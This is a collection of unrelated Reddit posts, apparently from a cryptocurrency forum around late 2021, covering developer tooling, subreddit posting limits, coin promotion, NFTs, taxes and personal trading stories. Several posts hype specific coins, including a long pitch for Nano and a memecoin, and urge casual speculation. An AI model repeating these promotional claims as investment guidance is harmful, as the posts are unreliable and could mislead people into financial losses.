I've started getting into developing on the blockchain. Learning solidity, working with Ethereum. I'm not good at it by the stretch of the imagination but I know a developer friendly chain when I see one. Polygon's SDK is that.

The documentation is immaculate. I haven't worked many other chains such as Cardano or Solana so I cannot speak for them. All I know is that Polygon's Documentation taught me more about developing on Ethereum and the chain than Ethereum did lmao.

Which chain does everyone think is the most developer friendly out there? For me so far, It's Polygon. Always good to know what the best environment is.

This came as a surprise to me when I was last writing up a post, so I decided to share it. I hadn't seen it shared around so I don't believe that it's common knowledge. I knew that there was a limit to the number of posts per coin, with BTC and ETH allowed more and alt coins allowed less. 

What I didn't know is that there was a recent change so that the number of coin posts is algorithmically determined according to their current market cap. 

The rules describe it like this:

&gt;In accordance with [this poll](https://old.reddit.com/r/CryptoCurrency/comments/oy7mva/algorithmic_limit_for_number_of_coin_posts/), the post limit per coin in the top 50 will be dynamically determined by the following algorithm: # of posts allowed = floor(10\*R\*(1+R-0.7)). R is the ratio of a coin's market cap to the total market cap. For posts about coins not included in the top 10, there will be a simple 2 post limit.

This is neat, but how does one actually know before posting how many posts for each coin there already are?

The answer is that there's a (admittedly rather sketchy looking) [dashboard](http://34.221.95.117:8080/) you can view that has the live status of the sub, showing you how many posts per coin are in the top 50 and whether any coins are near the limit (in which case, best wait to post about that coin). Yes, this is an IP-only URL. See the next step if this worries you.

If people are too sketched out by the weird link, which I understand, you can also be linked to it [here](https://np.reddit.com/r/CryptoCurrency/comments/qn2gbs/comment/hjdhepo/?utm_source=share&amp;utm_medium=web2x&amp;context=3) through a comment made by the bot which describes it as well. This comment only appears once the bot deletes a thread for violating the rule, but now you know and it's pretty clearly an official sub product. 

Hope this is useful to people!

Title gives it away. Just post any coin, good or bad, and I won't care about it. Neither will I praise or criticize in order to farm Moons.

The first comment will be Monero or Moons, the rest will the usual BTC, ETH, ALGO, VET and our new favourite SQUID.

it's obvious that SQUID is the best of them. it pumps while clearly stating it's a scam and still people love it, so it wins every discussion.

&amp;#x200B;

Well go ahead, post your coin and see how I don't give a damn, because these posts are pointless. just as this one is. I will post it anyway and take my 0 Karma for the post, since whoever upvotes this shit is a weird dude.

*Why were still early in crypto despite a new ATH for Bitcoin, why Bitcoin will have trouble becoming a broadly adopted store of value, and what I see happening in the long run.*

**This is a longread that I** [**published here on Substack**](https://senatus.substack.com/p/on-crypto-as-a-store-of-value-bitcoins)**. The TL;DR is that crypto has come quite far already, is becoming a more legitimate asset class, Bitcoin has issues as a store of value, and that I expect that in the long run a crypto like Nano will become the digital store of value.**

A few days ago, Bitcoin hit a new all-time high, as did the crypto market cap as a whole. At a total crypto market cap of almost $3 trillion, this is a huge accomplishment and crypto is something that is no longer being ignored. Despite this, Id argue were still early in crypto.

The biggest cryptocurrencies are currently not user-friendly. Bitcoin and Ethereum are the primary examples. On these chains, fees are high and transactions take a long time. The UX for any regular user is terrible. Imagine telling someone that your money of the future takes $30 for a single transfer.

Attempts are made to fix this. ETH2.0 should decrease Ethereum's fees, while Bitcoin has the Lightning Network.

Speaking as someone deep into crypto and not technically illiterate - these solutions are a long way from working well enough. Lightning specifically is not a solution I'd recommend to anyone. For a deeper dive, see [this thread on Twitter](https://twitter.com/mira_hurley/status/1451553977477341186).

We're also still early in terms of crypto as a store of value, despite the lofty valuations crypto is already seeing. 

Institutions \*want\* a better store of value than gold. Gold's flaws are well known, from physical security costs to yearly inflation to possible supply inflation in the long run through sea/asteroid mining. The world is ready for a digital store of value.

[**Bloomberg: Paul Tudor Jones is using crypto to hedge against inflation.**](https://www.bloomberg.com/news/articles/2021-10-20/paul-tudor-jones-is-using-crypto-to-hedge-against-inflation)

Many would say Bitcoin is the frontrunner for a digital store of value. It very well might be, currently. Yet I would argue that as a store of value, it leaves much to be desired for institutions. The dream for crypto investors is to see pension funds, institutional investors and even countries holding crypto as a reserve asset. So why not Bitcoin?

[**SPglobal: Energy-hungry Bitcoin poses questions for ESG-conscious institutions:** ](https://www.spglobal.com/marketintelligence/en/news-insights/latest-news-headlines/energy-hungry-bitcoin-poses-questions-for-esg-conscious-institutions-65007323)[institutional investors have increasingly dipped their toes in the waters of cryptocurrency over the past year, but concerns have been raised](https://www.spglobal.com/marketintelligence/en/news-insights/latest-news-headlines/energy-hungry-bitcoin-poses-questions-for-esg-conscious-institutions-65007323)

Institutional investors themselves are quite clear about this. Bank of America published a report about this subject recently, titled "Bitcoin's dirty secret". In this piece, they identify three drawbacks.

[**Al Jazeera: Bitcoins dirty secret: This thing is taking a lot of energy:** ](https://www.aljazeera.com/economy/2021/3/22/bitcoins-dirty-secret-this-thing-is-taking-a-lot-of-energy)[Bitcoins annual energy consumption now rivals that of some small developed countries, a new report found.](https://www.aljazeera.com/economy/2021/3/22/bitcoins-dirty-secret-this-thing-is-taking-a-lot-of-energy)

1) Bitcoin lacks an underlying usecase. Originally envisioned as a way to allow borderless, cheap transfers, Bitcoin nowadays is expensive and slow to use. Its only purpose seems to be for "number to go up".

2) Bitcoin might be outcompeted by cryptocurrencies with better fundamentals. This could be better usability as currency, but also stronger fundamentals as a store of value. This risk is salient - Bitcoin has some clear inherent flaws.

As an example, Bitcoin's security comes from decentralization. At the same time, mining Bitcoin comes with economies of scale due to the way Bitcoin is designed. In other words, Bitcoin is designed to encourage centralization over time. For more info, see [](https://senatus.substack.com/p/why-99-of-cryptocurrencies-centralize)[**Why 99% of cryptocurrencies centralize over time**](https://senatus.substack.com/p/why-99-of-cryptocurrencies-centralize)**.**

&amp;#x200B;

[  ](https://preview.redd.it/zrzzim6a5sx71.png?width=602&amp;format=png&amp;auto=webp&amp;s=30f7810c93609ef4d4174b18aa6871448e78cef5)

3) Bitcoin comes with immense energy usage. There isn't a single serious investor without an ESG board nowadays. Bitcoin doesn't pass even the most cursory inspection. As BAML calculated, a $1 mln investment into Bitcoin adds 5,400,000 kilo in CO2 emissions, annually.

&gt;[*Comparatively, we do not find many other human activities that have a higher carbon footprint per dollar of inflow.*](https://pdfhost.io/view/6ZYoHx4Dj_Commodity_Strategist)

It's not just CO2 emissions. Bitcoin mining is reliant on ASICs, which lead to generous amounts of electronic waste. [In Digiconomists estimates](https://digiconomist.net/bitcoin-electronic-waste-monitor/), this currently amounts to an annual electronic waste comparable to the small IT equipment waste of the Netherlands.

As most investors in the business will tell you, Bitcoin's environmental impact means they simply are not able to invest in it, regardless of their desire to invest in a digital store of value.

This is why I say we're still early. The image of a digital store of value is appealing, but the current frontrunner has its own share of issues.

So how does this develop into the future? Well, it could go one of many ways. My thoughts on it might not align with the majority right now.

One thing that could happen would be Bitcoin moving to PoS. This is not the panacea it appears to be. While it would solve Bitcoin's energy usage, it could still keep Bitcoin slow and expensive to use. Additionally, PoS still suffers from centralization. For more info, see also [**The risks of staking for the long-term crypto environment**](https://senatus.substack.com/p/the-risks-of-staking-for-the-long)**.**

We could see more backlash against crypto for the massive energy usage of some cryptocurrencies, we could see governments trying to push it into the ground. Crypto might never turn into a true store of value.

**I think a more positive future is possible**. To succeed in the long term, I think we need to rethink crypto from the ground up. Our digital store of value needs to have low energy usage, remain secure in the long run and offer an underlying usecase.

ETH's move to PoS in ETH2.0 would come close, and institutions are watching it with interest. It could solve ETH's energy issues. Other efforts are ongoing to increase its scaling and thus usability. Because of this, I expect Ethereum to do better than Bitcoin in the next few years. 

However, moving to PoS wouldn't solve ETH's trend towards centralization. For that, a more radical rethink is needed.

[**The risks of staking for the long-term crypto environment.**](https://senatus.substack.com/p/the-risks-of-staking-for-the-long) *How Proof of Stake discourages usage, makes the rich richer, and increases centralization over time.*

Reasoning from first principles, the ideal crypto solution would need to take away the drive towards centralization, while offering a scalable and green solution that has strong store of value properties. Let's unpack that.

Any system that rewards validators while taking away from users trends towards centralization over time. Users pay fees, validators receive these fees or receive newly created tokens in exchange for their validation services. This is true for both PoW and PoS systems.

A radical yet thorough method of removing this centralizing pressure is to remove rewards. Without fees being paid, without additional supply being created and without validators receiving an ever larger share of supply, centralization does not follow.

In such a zero-fee design, there would still be incentives to validate. Those deriving value from the network through using it to transact or store value would gladly validate as long as it was cheap enough, for example. [**More reading on the incentives in a zero-fee system**](https://senatus.substack.com/p/how-nanos-lack-of-fees-provides-all-the-right-incentives-ee7be4d2b5e8).

https://preview.redd.it/9uo7g4cf5sx71.png?width=602&amp;format=png&amp;auto=webp&amp;s=6a6c85d8f5513d7b194ca39c306de75483ca6a4d

A zero-fee design decision also plays into store of value properties. While Bitcoin has new supply being issued annually, this new design would have a purely fixed supply. There is no "leakage" such as in Bitcoin, there are no miners bringing new supply to the market.

Because of the lack of competition over validation rewards, energy usage is low in this design. In fact, everyone is incentivized to validate transactions as efficiently and cooperatively as possible.

The computational power that is no longer used to compete against other miners can then be used in a different way. As an example, hardware power could be used to validate *more* transactions faster, rather than competing over validation of a *fixed* set of transactions.

Through this design, a cryptocurrency could prevent centralization over time, while having an ironclad fixed supply, at extremely low energy usage.

What more could one wish for in a digital store of value? According to Bank of America, aside from security, fixed supply and being eco-friendly, an underlying usecase adds true value.

Anyone who has ever run a store or transacted internationally will tell you they can see the value in a feeless currency that knows no borders. It allows any store owner to accept transactions without payment processors taking a cut.

It allows me to transfer to friends on the other side of the world without a cent paid in fees. The possibilities offered by a feeless, borderless form of money are endless. In an ideal world, such a currency would transfer instantly.

I strongly believe that this is the form of cryptocurrency that institutions are waiting to discover. It takes the strong basis of Bitcoin and improves on it, while fixing issues such as centralization and energy usage that have grown over time.

Crypto enthusiasts will know where I am going with this, because not many cryptocurrencies can be described as being both eco-friendly, instant to transact with, and completely without fees.

[**The basics of Nano - a futuristic digital currency offering nstant, feeless and eco-friendly tranfers**](https://senatus.substack.com/p/the-basics-of-nano-why-its-such-an)**:** *How Nano manages to be green, fast and feeless, why Nano is so innovative, and what the usecases for Nano are.*

We're still early. Most people have never heard of Nano, and Nano is so small that it is likely not on the radar of institutional investors. However, take a 5 or 10-year look into the future here for Bitcoin and Nano.

Option A is a fundamentally flawed cryptocurrency most known for being first. It lacks underlying use and is terrible for the environment.

Option B stood on the shoulders of giants, saw and fixed the issues that A was facing, and is eco-friendly.

Option A is currently valued about 1000x as highly as option B.

Bitcoin's issues become more apparent with every passing day. It might nonetheless still survive a long time through its first-mover effect.

However - would you want to be stuck with BlockBuster when Netflix is looming? Invest in Yahoo when Google exists? Buy some Nokia shares when Apple has just released a certain iPhone?

I strongly believe in rationality in the long run. I believe that a 1000x improvement might take a while to be accepted, but wins out in the long run. I believe in fundamentals over noise.

In other words, I believe that in the long run, we'll all be swapping our Bitcoin and gold for Nano. It's becoming apparent that inflation is coming to practically every currency, and the search for the ultimate store of value will inevitably lead to Nano.

To me, the question is which institution or big investor will be the first to do so. Nano is the store of value they're searching for but are unaware already exists. Those first movers will see great rewards. For the planet's sake, I hope it happens soon.

[**Swap Bitcoin for Nano, save the planet.**](https://senatus.substack.com/p/swap-bitcoin-for-nano-save-the-planet) *Why choosing Nano over Bitcoin helps save the planet and might make for an excellent investment decision.*

 Hello. I never was interested in crypto currency, never read about it and etc. But now whole world talk about it. I'm thinking about investing 100-200$ on some ''shitty'' crypto coin, and its not like serious investment, its more like a gamble, maybe after like 6 months that coin become very expensive and I will have huge profit, and maybe I just lost 200$.  
But I don't have any knowledge on even where to buy things like that, where to keep it, and how to cashout. So maybe somebody can help me with that, where I can safely buy any kind of crypto and cash out at any point.

I've tried and tried again, but I still don't understand how NFTs can hold such a wide range of values, what people do with them, or anything else about them. Some NFTs have the appearance of how 5th graders would draw them. This thought is just beyond it.

People tell me they're collectibles when I tell them I don't understand it. Then I realize why I don't get it: Its the same thing about retro collectibles. Theyre like those baseball cards, game cartridges, Old CDs or anything thats been a limited edition from before. The more rare the stuff gets, the more their prices increase. 

One of the NFT collectibles that caught my attention is [Papermen](https://paperpeople.io/?r=1): think of it like Cryptopunk and Crypto Kitties except this time its digital origami. Theyre a new NFT series of one-of-a-kind works of art.

Back to the topic of NFT art. People who first invested a few hundred or thousand dollars in ETH now own millions or tens of millions of dollars in the cryptocurrency. NFTs are one of the first "fun" crypto ecosystems, allowing bag holders to spend their ETH on anything they want.

Bitcoin could replace gold exchange-traded funds (ETFs) and outpace the SPDR S&amp;P 500 ETF Trust if there was a spot Bitcoin ETF, MicroStrategy CEO Michael Saylor said during the Bloomberg Financial Innovation Summit on Thursday.

Quote: And once these spot ETFs roll, I think youll see billions, then tens of billions, then hundreds of billions, then trillions of dollars flow into them. - Michael Saylor

Background: A pair of Bitcoin futures ETFs began trading in October. Bitcoin futures is a derivative product. A spot Bitcoin ETF tracks the actual price of Bitcoin. It allows investors to get exposure to the asset without actually owning it.

What the Expert Says: Saylor said on Thursday that Bitcoin futures are inferior.

Final Thoughts: A spot Bitcoin ETF probably wont get approved by The U.S. Securities and Exchange Commission until 2022.

The meme coin craze has been real lately, especially in light of the money made from Dogecoin and Shiba Inu, but now there's a new rising competitor in the animal coin market: Catgirl coin.

Catgirl coin is breaking out on Google Trends. If you search, you will see that over the last few weeks there has been massive increase in trading volume that fluctuates along with the google trend chart. Tiktok cryptoks have comment sections full of "catgirl". Influencers are beginning to say optimistic things about the coin, identifying the solidity of the project as a proponent to its potential; however, plenty of people are still unsure about the coin, calling it a rug pull, memecoin (*derogatory*), or just don't want to speak on it. 

[Catgirl Coin](https://coinmarketcap.com/currencies/catgirl/) is an NFT-centric crypto project that has a real-world use case. The catgirl [hub](https://www.catgirl.io/) features giveaways, mystery boxes, NFTs, with farming and marketplace coming soon. The next giveaway is scheduled for November 8th and Catgirl coin was first released in June, so it's a project in very early stages. 

So far Catgirl is listed on pancakeswap, bkex, hotbit, and lbank, with hotbit and lbank joining the exchange just in the last 24 hours, each time causing a spike in price. The total supply of Catgirl Coins is 100 quadrillion, where 50% of that supply has supposedly already been burned. The current price at the time I am typing this is $0.000000007263 and the all time high was $0.00000002284 on 11/1 when reportedly one wallet bought nearly $8million USD of the coin and caused the coin to lose a 0 and temporarily rise 300% in less than an hour before cooling back down. 

But, I haven't seen a peep about catgirl coin on this sub. Maybe because there's a shared scorn of memecoins, maybe because many think it's a rug pull/scam. I'd like your thoughts on catgirl. I'd ask r/catgirlcoin , but I'm sure I already know the sentiment on there. Do you like the catgirl project? Do you think catgirl deserves to be dubbed a memecoin? 

&amp;#x200B;

TLDR; seems legit?

Observing the creepy unethical pig who calls himself "Bitboy", I personally think these above mentioned channels give out much better information compared to Bitboy, or the Pomp.

No ridiculous shilling or predictions, a sense of community, warning their audience the pitfalls of crypto markets &amp; greed.


Is it so, or am I being wrong here.

P.S:

Please dont bring Ben Cowen, Coin bureau or Invest answers - these channels sit in a higher tier of quality in my opinion compared to the channels I've mentioned in the title. ( ofcourse There are instances when Coin bureau &amp; Invest answers  made their mistakes too)

I see this especially whenever there is a big move up or down. Big move down you get all these people coming on talking about how everyone needs to take crypto investing serious (try not to laugh), how you can't just throw money at it and make money (again try not to laugh). How you need to only spend money you can afford to lose, how this is a big man's game  with no room for rookies, pretending that they are trading lots down on the CME exchange. It is fucking crypto dude, just put money in it then look away.   


If it is a big move up, sometimes the same people, talk about how crypto is the future, about how they knew all along that this move was going to happen, that you just need to hodl, and if you got out you arn't man enough for this business.   


Regardless it's the same , people looking down from their crypto high horse because they think they are rich, even though they are still peasants in the eyes of Sir Raymond Wong Jr PhD. They are the equivalent of putting on that Burger King paper crown and declaring themselves king of the crypto subreddit, here to bestow upon you life lessons from fortune cookies, to sound wisened and authoritative.   


  
Just look at the front page jesus. Shut the fuck up , just put money on random shit and forget about it. No one here knows better than anyone else about crypto beyond that.

So with the algo governance system now fully in swing. I'm just wondering how everyone is feeling about the way the vote is right now (obviously going directly for option b) 

Are the people on this sub feeling like that's the right option or as I've read a few things do you think it's just the whales deciding and we never really had a choice?

I voted option A) but  option B) won't stop me from committing more algo and being diligent with my voting.

Also this algomint stuff coming seems pretty cool how the hell they make Bitcoin "carbon neutral/negative is entirely beyond me. 

Really I just want a discussion in the algo vote and how people are feeling.

I have a Ledger device and have my 24 words written down and hidden. But I'm trying to figure out how those 24-words can get me access to my private keys on multiple block-chains? It would make sense to me if I had a 24-word for each wallet: 1 for Bitcoin wallet, 1 for Ethereum wallet, 1 for Tezos wallet, etc.  But that is not the case. Somehow 1 24-word gives me access to all. How is that possible? How do those words work?

Hello everyone! 

I bought a small amount of BTC and ETH at the high back in 2017/18 on coinbase, converted to some smaller coins on other exchanges, and held through the bear market. Transferred back to coinbase and sold nearly everything near the peak at the beginning of summer this year.

Regrettably, it did not dip into another bear market (where I could buy back in). I am upset that my speculations were wrong and I didn't hold longer. 

My question is, if I buy back in before the end of the year, do I need to pay taxes? And if so, how do I go about reporting that? If I buy back at a higher price than I sold, does this count as a loss? 

At some point, I do think it could drop substantially again, because it's bitcoin. If I have to pay taxes regardless of when I buy back in, am I better to wait and watch for the next dip, which could be days, weeks, or years from now?

I have an issue with taxes on coin/token swaps. I buy 1000 ALGO for about $2000. In a few months, I trade all of my Algo for 1 ETH (not that I ever would). When I made the trade 1000 Algo was worth $4500 for a net gain of $2500 so I owe capital gains tax on that. But if I never exchange to fiat it hasnt been realized. I made half an ETH not $2500. Seems I should be taxed in ETH rather than dollars. So I owe them 0.25 ETH, say. Now I have 0.75 ETH and its worth $10,000 in another few months (next tax year). I swap to ADA and I owe x amount in taxes now. I hold 5000 in ADA holdings now, lets say. I never cash out to fiat so I paid all these taxes in fiat, from my savings. Months later ADA crashes to $0.10 and I have nothing to show for it but a loss while the govt profits from my swaps. Hardly seems fair. Paying taxes on swaps in crypto rather than fiat seems fair, not in fiat. What am I missing here?

Since there's another thread that's roasting coins to introduce the new users on this sub to the coins and their downsides. We might just as well get a thread going that highlights the most positive thing about certain coins. Countering the hopium is one thing but we can't scare the new users away either. Let's get an good informative thread going for new users so that they might do their own research more extensively on their coins. For all we know the veterans of this sub might still learn a thing or two. Let's get that hopium going.

So comment your coin and we'll tell you the biggest upside it has so that your research might be reaffirmed.

Trends in crypto fly faster than a fighter jet (and often land about as gracefully as the Dodo bird.)

The latest is the metaverse, a magical, 3D rendered, wonderland of virtual real estate, concerts, and of course, casinos. 

Facebook is all in along with Microsoft. Crypto would-be-giants Decentraland and the Sandbox are too (with wicked price pumps and recent drops)

Fad or future is anyones guess, but the FOMO is real. Before you start throwing your hard-earned fiat into the next crypto craze consider this:

The Tech

While its pretty basic at the moment (graphics, movement, etc.) the hope was augmented reality would make this a truly immersive experience. 

1. There was a company promising an amazeballs consumer-oriented augmented reality experience that would make normie reality boring by comparison. 

They raised over $1 billion in venture funding from the majors. Had a genius mad scientist visionary CEO. Ever heard of Magic Leap? They laid off 1,000 employees last year and closed their consumer division. The tech just never delivered. 

The competition

2. Massive online gaming giants are already virtual worlds. There are going to be a literal shit ton of competitors out there. 

The Human Experience

3. People have been online more than usual because of Covid. Zoom fatigue is real. People want real life human interaction. 

Maybe theres a segment of the population that will enjoy virtual worlds for a while, but as Facebook has learned they quickly move on (their teen base of users is shrinking fast.)

A recent Morning Consult poll (source link below) showed that people arent that interested in the metaverse (even Gen Zs and Millennials). 

Maybe were just early. Maybe climate change will make going outdoors so dangerous people link their eyeballs to indoor screens for most of the day. 

But once you start seeing ads in your dreams in may be too late. . .

I have a little over $20 in SHIB in my Coinbase wallet that Id like to convert to BTC or ETH or basically anything with a better future than SHIB. I dont see either of those options, though, and anything else Ive tried from the possible options says I need to add something like $650 worth of ethereum to continue. I knew the SHIB was useless, but wow. Am I missing something or do I just let it sit and hope someone famous tweets about it going to the moon or something?  Luckily, it didnt cost me anything. Just wish I had converted it prior to sending it to my wallet. Any other options?

Morning /r/cryptocurrency!  


Today marks the finale of the 10,000 moon project.

&amp;#x200B;

1 year ago today, [I made a post where posters here could pick coins](https://np.reddit.com/r/CryptoCurrency/comments/joj3q6/the_great_moon_experiment_beginning_today/) and I would hold them for a year - After the year, I would distribute the results to the people who got the 10 highest voted coins.

There's been plenty of ups and downs - The $50 into DOGE last november turned into $15,000 - [Which I asked the user if they wanted to sell and they did - Generously donating $5k to a nonprofit chosen by the community](https://np.reddit.com/r/CryptoCurrency/comments/n9e8kz/009btc_charity_donation_help_choose_a_nonprofit/).

&amp;#x200B;

Without further adieu, here are the final results (Apologies for the lack of blockfolio graph - Old tablet died):

&amp;#x200B;

**ETH - 0.121 - $544.50**

ETH has gained almost 11x from last November, not only following Bitcoin on the way up but having its own price discovery - Hitting multiple all time highs and making pretty much every fan of the project happy along the way. A $50 investment has turned into $544.50, and that's definitely better than your local bank!  


**NANO - 70.3 - $407.74**

You know, it hasn't been the biggest year for NANO - There were some rises and some falls, but it mostly stuck with Bitcoin and did it's own thing. A fairly quiet year for the project led to it mostly staying on the same tracks - But that still ended up with 8x gains from the original investment. Not a bad trade!  


**ADA - 504 - $1,008**

After a huge breakout year where holders saw 100x gains, ADA has regressed back just a little, but the vast majority of holders of the project must be super happy about where it is. With smart contracts finally released and the project looks pretty solid, ADA has enjoyed a blistering 20x gain from the original $50 input.

&amp;#x200B;

**VET - 4,911 - $775.93**

VET has had its ups and downs, rising to a huge all time high and then heading back down the ladder, only to find a bit of a resurgence as the year enters its end times. Overall, the project has looked pretty sold, with a 15x return from the start of the project.

&amp;#x200B;

**XRP - 212 - $248.04**

In a year bogged down with lawsuits and delistings, XRP wasn't the star performer of the crowd like it was in 2017 - It hit lows not seen for years before bouncing back up with Bitcoin and the possibility of a positive result in the lawsuit. Regardless, it still managed 500% returns from the beginning of the year, sitting about roughly even with Bitcoin itself. Could be worse!  


**IOTA - 204 - $277.44**

  
Nothing special for the tangle this year either - Roughly moving with Bitcoin almost the entire way and not really having breakthroughs at any point of the year. Still, nothing wrong with that, you could've invested in government bonds instead of having 5x returns.

&amp;#x200B;

**LTO - 734 - $213.81**

&amp;#x200B;

LTO started the challenge off about as strong as could be - Rocketing to new all time highs every day, but has not kept up the rocket fuel needed to stay there. As a result, it's sat around roughly $0.30 since "the good ol' days" of the project. As such, 4x returns is all this project managed to hang onto - Which is not great for this project, but damn good overall!

&amp;#x200B;

**SOL - 27 - $6,417.36**

Well, there's nothing more to be said here. SOL's initial $50 investment has ballooned into the current #4 crypto, with expectations sky high.  It's become a community favourite, and no wonder - SOL's returns from the beginning of the project are an almost unbelievable 128x.

&amp;#x200B;

**XMR - 0.453 -117.07**

By far the worst performer of the entire challenge, almost from the start to the finish, XMR has remained one of the least profitable investments in the entire challenge. XMR underperformed Bitcoin, and the vast majority of other cryptos. Still, better than having your money in a bank with 0.05% interest!  


**XLM - 72 - $26.56**

&amp;#x200B;

Ok, to be fair to XLM, this was swapped in the middle of the challenge at almost the top of the May cycle - When DOGE was sold, so it's not an entirely fair look to XLM - It's done relatively well over the year but was bought at almost the most unrealistic level possible. To make it fair, I will swap $25 more to make up a $50 investment for the person who suggested it.

&amp;#x200B;

 

The last time the portfolio was tracked, it was at **$7608.46** giving us a net gain of of **$2427.99** from October to November.

If the $500 (10,000 moons) had been left in moons, they would currently be worth **$1739.16.**

If the $500 had been left in BTC (0.0353 \* $54,200), it would be worth $**2176.24.**

&amp;#x200B;

It was a fun ride! The portfolio has outperformed pretty much everything, $500 has turned into over $25,000 to be distributed, and I'll ping the winners shortly so they can post their addresses for their christmas presents.

Thanks for playing everyone :)

Hey guys, I  just wanted to share with you a bitcoin story. 

I was in high school back in 2015, and there was this nerdy guy in my class that use to build computers and spend all of his time on internet. 

On day, he came to me and talked to me about bitcoin (back then it was at around 250-300$). He told me that I should invest like 100$ and that it was going to explode in a couple of years. I was like "oh yeah sure I will check it out tonight" and I never did of course. 

I can't remember how much he bough but I know that he sold everything he had when bitcoin hit 20000$ (he know regrets it) and made around 100-120k$. He spent half of it to pay for university. 

The very funny part (not that funny maybe) is that he was not American and during a Trump demonstration he got problems with the police and got expelled from the US territory. He then got expelled from his university, which didn't want to pay him back his 60000$ that he had spent for his two first years.

Now every time we see each other we talk about this crazy story and how I should have listen to him haha. Maybe he will recognise himself if he is on this sub.

The amount of people using Crypto is still around 150 million people. This is miniscule compared to what Crypto can achieve in just a few more years. Crypto grew **100%+** in terms of new users just the past year alone.  

Crypto also has a market cap of just $2.5 Trillion which isn't appropriate for a global asset like Crypto which is open to literally everyone. Even people without internet can buy Crypto using cold wallets. $2.5 Trillion is absolutely nothing considering other assets which are way harder to access are already at tens of trillions of dollars.

The historical price action also makes it pretty clear that it is never too late. Looking at a logarithmic chart of Crypto price action makes a very clear pattern that Crypto is growing exponentially. This is also aided by the fact that there is compounding inflation every year. [Some estimates already suggest that Crypto can reach at least **$100 Trillion** in market cap in as soon as 10 years.](https://www.investing.com/news/cryptocurrency-news/crypto-market-cap-closing-to-3t--could-hit-100t-in-a-decade-2665818) 

In my opinion, a market cap of $2.5 Trillion for an asset like Crypto is just not appropriate. There are still **7.65 Billion** people to go until Crypto becomes a mainstream asset. We are still, undeniably, extremely early!

I understand the feelings associated when a group you care about starts moving away from how it was and changing/expanding . I know you often feel like you've lost something, however...i think some of you are missing out on part of the bigger picture with crypto's popularity boom.  For many of us, this is the only opportunity  we have ever had to get involved in emerging technology and finance. 

Please correct me if i am wrong, i'm not an old head when it comes to crypto AT ALL and happy to be corrected but speaking for myself getting involved in crypto has been a way for myself and my friends to learn about new technologies AND try to put ourselves in a position to gain even the smallest amount of financial benefits whilst doing so. For most of us, this is something we have never had the opportunity to do before through more traditional means due to lack of accessibility  (and often, education).

People post in this sub all the time from nations where their monthly income is minuscule in comparison to others, talking about how crypto trading/staking etc is changing their entire lives and the lives of their families.  Even when Doge blew up we saw posts and posts from people who had invested even just $100 being able to afford life saving surgery for their pets, pay for car repairs and textbooks. As crypto is becoming more popular and more accessible we are seeing groups of people who usually miss out completely getting to take part and reap rewards. 

I won't pretend to understand any more than 2% of crypto as an industry... because i don't hahahaha but i just think that some of these posts that hark back to the old days of early adoption are discounting some of the insane benefits that many groups who have been excluded from previous forms of technological/financial developments are reaping in real time. Investing in stocks requires a much larger buy in which excludes a massive portion of the world so although i do not doubt that there ARE shitty trends occurring in the space right now and dangers lurking ahead, i think its important to try to keep perspective of the very real world life changing stories happening every day in this community to groups of people who previously could only have dreamed of such things. 

Again, there are very valid arguments in the posts that i've been seeing today i just wanted to post something to remind people of the other side, the side where people like myself and many others are getting to back technology we believe in AND gain some rewards in a way that has never been possible before.   
It's life changing.

They were in the top 5 most grossing apps in the entertainment category last week and 7 days later they are in the top in in all categories.

They have managed to do this with no advertisement whatsoever... I think they deserve some praise for their work. 

Also, they will be dropping the first ever Disney NFTs in the next few days for anyone that is interested! The collection is called the 'Disney Golden Moments'. No news on what the price for each drop will be but we do know that the Ultra Rare rarity will come with a 1 year Disney Plus membership.

Logged into Binance the other day for the first time in a while. Had $25 in random cryptos, forks and airdrops that I turned to BNB.

I YOLOd that whole fucking $25 into a shitcoin called ELONBALLS at the top. 

I was like hell yeah, of course ELONBALLS is the next Shib, like look at all the Pokelons this rugpuller worked so hard on.

I mean, it was crypto I didnt know I had, so I was like whatever. Shouldve just bought more MATIC or ETH or DOT or something or dive into LRC. But noooo.

Ive been in this space for a while, and I wasnt smart and decided to gamble. 

But the ELONBALLS will be in my degenerate MetaMask wallet, here to stay, as a reminder of the time I tried to become Jeff Bezos

Crypto com is at the top of their game when it comes to marketing. They literally have partnerships with MAJOR sports brands. To name a few: UFC, Formula 1, NBA, Serie A, Paris Saint German.. They are also to be found in the multibillion dollar gaming segment, partnering up with the streaming service Twitch (Twitch Rivals) and esports team Fnatic. 

They have insane exposure in all major categories but that's not all there is to it. Their Visa Cards are some of the most popular on the market, offering different rewards based on how much CRO you've staked. You're basically staking CRO to get more CRO while also reaping the card benefits with no annual fees. 

Crypto com's APP is easy and simple to use. It offers 30 days 0 fee purchases for new users. This is such a smart way bring in even more people into the ecosystem. 

&amp;#x200B;

I suspect the reason we are pumping right now is because of the **Cronos Mainnet Launch** in less than a week. It allows developers to instantly port dapps from any Ethereum and EVM-compatible chains. It's designed to scale the DEFI ecosystem. Cronos is offering the developers a super easy to use platform and a huge global userbase.

Im trying to understand polkadot parachains and slot auction, I understand that there are diffrent platforms for which you can vote and give your dots as vote and then they got stacked on the project for couple of years( 2 I think) if the project wins.
But i would like to know more details, I've join to crypto when the crash start in may and I am trying to understand the whole crypto world how it works and all that stuff.. And right now I am particulary interested in that event going right now.
So if there is anybody who understand that topic a little better I would be delightful to hear your thoughts and explaination.
And also if somebody knows which parachains are worth looking into it

Thank you

Title cheks out.

I currently planing to save an amount about 500$ every month for crypto investments. What is in your opinion the best strategy to invest that money into crypto?  
Do you just buy whatever the current price is or save and wait for the dip? Also would you suggest splitting or go full BTC/ETH? Which ratio you split if you do?

I like the gambling aspect of crypto and i even consider going 2/3 Alt but i am fairly new to crypto so that would be even more risk. 

Obviously there is not THE right answer but i'm curious what strategy my fellow cypherpunk billionaires have.

Best regards

I started getting into crypto back in 2017 where I did some transactions over some services I did online. Back then I was only 18 years old and I didn't understand much about crypto and I didn't have a mind of an investor. I never used to invest, I never used to have money.

Couple of years forward, in 2020, when the pandemic hit, I finished my graduation and I was searching for a job. But because of the pandemic, It was hard for me to find a Job, because everything was closed from where I'm from.

I started watching a lot of streams and that led me to started gambling in crypto casinos. I made some bits of money there, but what I gained the most was the fact that I started getting into crypto.

I started low, with a couple hundred bucks, made some investments and I must say that I was incredibly lucky, all my investments made profit, a ton of profit. This is also because I joined back in May/April 2020, when the crypto went to shit, that means I got in at the BEST time. So my profits were surreal for someone new to crypto.

My parents started realizing that I was making money, probably more money that I would made if I was working a full-time job.

Fast forward to now, I'm 21 years old and I was able to get my father, brother, uncle, cousin, girlfriend and a lot of my friends into crypto. I never talked about how much money I won, or how much I have now, I just gave them some insights about crypto, how awesome it is, and how crypto might be the future.

Also I tried to warn them about the dangers of crypto, this isn't a safe investment and it isn't easy money.

